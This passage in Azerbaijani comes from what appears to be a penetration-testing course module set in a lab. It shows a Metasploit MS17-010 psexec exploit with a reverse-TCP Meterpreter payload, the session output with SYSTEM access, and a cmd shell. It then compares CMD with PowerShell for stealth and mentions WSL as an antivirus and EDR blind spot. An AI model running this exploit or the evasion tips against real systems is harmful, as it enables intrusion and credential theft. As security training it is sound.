   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Bu dəfə, biz sadə saxladıq və sadəcə `windows/meterpreter/reverse_tcp` payload-u istifadə etdik. Əvvəlki payload bölmələrində göstərildiyi kimi, fərqli bir shell növü üçün və ya hücumunuzu daha çox qarışdırmaq üçün bunu dəyişə bilərsiniz. Seçimlərimiz təyin olunduğuna görə, gəlin bir cəhd edək və shell əldə edib-etmədiyimizə baxaq.

**Hücumu İcra Et və Geri Zəng Qəbul Et.**

**Hücumumuzu İcra Edin**
```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

Uğur! Eksploitimizi yeritdik və shell sessiyası əldə etdik. Üstəlik, SYSTEM səviyyəli bir shell. Əvvəlki MSF modullarında göründüyü kimi, indi ki, Meterpreter vasitəsilə açıq bir sessiyamız var, biz `meterpreter >` promptu ilə qarşılaşırıq. Buradan, Meterpreter-dən sistem məlumatını toplamaq, istifadəçi şəxsiyyət vəsiqələrini oğurlamaq və ya hosta qarşı başqa bir post-eksploitasiya modulu istifadə etmək üçün əlavə əmrlər işlədə bilərik. Əgər hostla birbaşa qarşılıqlı əlaqədə olmaq istəyirsinizsə, Meterpreter-dən hostda interaktiv shell sessiyasına da düşə bilərsiniz.

**Yerli Shell-i Müəyyənləşdirin.**
```
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Biz Meterpreter əmri `shell` işlədəndə, hostda başqa bir proses başlatdı və bizi sistem shell-inə saldı. Prompt-dan nəyin içində olduğumuzu müəyyən edə bilərsinizmi? Sadəcə `C:\Windows\system32>` görmək bizə sadəcə `cmd.exe` shell-ində olduğumuzu göstərə bilər. Əmin olmaq üçün, shell-in daxilində `help` əmrini işlətmək də sizə bildirəcək. Əgər biz PowerShell-ə salınsaydıq, promptumuz `PS C:\Windows\system32>` kimi görünərdi. Qarşıdakı `PS` bizə onun PowerShell sessiyası olduğunu göstərir. Ən son istismar etdiyimiz Windows hostunda shell-ə düşdüyümüz üçün təbriklər.

İndi ki, bir nümunə kompromis prosesini yerinə yetirdik, gəlin hosta düşəndə görə biləcəyiniz shell-lərə nəzər salaq.

**CMD-Prompt və Power[Shell]-lər Əyləncə və Mənfəət üçün.**

Biz Windows hostları ilə şanslıyıq ki, standart olaraq istifadə etmək üçün bir deyil, iki seçimimiz var. İndi maraqlana bilərsiniz:

*Hansı doğru istifadə ediləcəkdir?*

Cavab sadədir, o anda sizə lazım olan qabiliyyəti təmin edən. Bir dəqiqəyə cmd və PowerShell-i müqayisə edin ki, onların nə təklif etdiyini və birini digəri üzərində seçməyin ən yaxşı vaxtının nə olduğunu anlayasınız.

CMD shell-i Windows-a daxil edilmiş orijinal MS-DOS shell-idir. O, əsas qarşılıqlı əlaqə və hostda İ.T. əməliyyatları üçün hazırlanmışdır. Bəzi sadə avtomatlaşdırma batch faylları ilə əldə edilə bilərdi, amma hamısı bu idi. Powershell cmd-in qabiliyyətlərini genişləndirmək məqsədi ilə gəldi. PowerShell CMD-də istifadə olunan yerli MS-DOS əmrlərini və .NET əsaslı tamamilə yeni bir əmr dəstini başa düşür. Həmçinin, özündən kifayət edən yeni modullar PowerShell-ə cmdlet-lərlə də tətbiq edilə bilər. CMD promptu mətn girişi və çıxışı ilə məşğul olur, Powershell isə bütün giriş və çıxış üçün .NET obyektlərindən istifadə edir. Nəzərə alınması lazım olan başqa bir mühüm məsələ budur ki, CMD sessiya zamanı istifadə olunan əmrlərin qeydini saxlamır, halbuki PowerShell saxlayır. Beləliklə, gizli olmaq kontekstində, cmd ilə əmrləri icra etmək hostda daha az iz buraxacaq. İcra Siyasəti və İstifadəçi Hesabı Nəzarəti (UAC) kimi digər potensial problemlər hostda əmrləri və scriptləri icra etmək qabiliyyətinizi məhdudlaşdıra bilər. Bu nəzərə alınanlar PowerShell-i təsir edir, lakin cmd-i yox. Nəzərə alınması lazım olan başqa böyük məsələ hostun yaşıdır. Əgər Windows XP və ya daha köhnə hosta düşsəniz (bəli, hələ də mümkündür..) PowerShell mövcud deyil, buna görə yeganə seçiminiz cmd olacaq. PowerShell Windows 7-yə qədər ortaya çıxmadı. Beləliklə, hamısını yekunlaşdırmaq:

**CMD-dən istifadə edin:**

*   PowerShell-i əhatə etməyən köhnə bir hostdasınız.
*   Hostla sadəcə sadə qarşılıqlı əlaqə/giriş tələb etdiyiniz zaman.
*   Sadə batch faylları, net əmrləri və ya MS-DOS yerli alətlərindən istifadə etməyi planlaşdırdığınız zaman.
*   İcra siyasətlərinin hostda scriptləri və ya digər hərəkətləri icra etmək qabiliyyətinizi təsir edəcəyinə inandığınız zaman.

**PowerShell-dən istifadə edin:**

*   Cmdlet-lərdən və ya digər xüsusi qurulmuş scriptlərdən istifadə etməyi planlaşdırdığınız zaman.
*   Mətn çıxışı əvəzinə .NET obyektləri ilə qarşılıqlı əlaqədə olmaq istədiyiniz zaman.
*   Gizli olmaq daha az məsuliyyət olduqda.
*   Bulud əsaslı xidmətlər və hostlarla qarşılıqlı əlaqədə olmağı planlaşdırırsınızsa.
*   Scriptləriniz Ləqəblər təyin edir və istifadə edirsə.

**Linux üçün WSL və PowerShell**

Windows Subsystem for Linux, hostunuza daxil edilmiş virtual Linux mühiti təmin edən Windows hostlarına təqdim edilmiş güclü yeni bir alətdir. Biz bunu qeyd edirik, çünki tez dəyişən əməliyyat sistemləri landşaftı çox güman ki, hosta giriş əldə etmək üçün yeni yollar təmin edə bilər. Bu modulu yazarkən, vəhşi təbiətdə bir neçə nümunə zərərli proqram Windows hostuna payload-ları yükləmək və quraşdırmaq üçün WSL vasitəsilə Python3 və Linux ikili fayllarından istifadə etməyə cəhd edirdi. Bu yazıda olduğu kimi, hücum edənlər həmçinin hostda digər hərəkətləri yerinə yetirmək üçün Windows və Linux üçün yerli olan daxili Python kitabxanaları ilə yanaşı PowerShell-dən istifadə edirlər. Qeyd etmək lazım olan başqa bir şey budur ki, hazırda WSL instansiyasına və ya ondan icra olunan hər hansı şəbəkə sorğuları və funksiyaları Windows Firewall və Windows Defender tərəfindən analiz edilmir, bu da onu hostda bir növ kor nöqtəyə çevirir.

Eyni problemlər hal-hazırda PowerShell Core vasitəsilə də tapıla bilər, hansı ki, Linux əməliyyat sistemlərində quraşdırıla bilər və bir çox normal PowerShell funksiyalarını daşıyır. Bu iki anlayış xüsusilə gizlidir, çünki bu günə qədər hücum vektorları və ya onları izləmə yolları haqqında çox şey məlum deyil. Lakin bu xüsusiyyətlərə yönəlmiş hücumların AV və EDR aşkarlama mexanizmlərindən yayındığı görülüb. Bu anlayışlar bu modul üçün bir az qabaqcıldır, lakin gələcək bir modulda onları gözləyin.

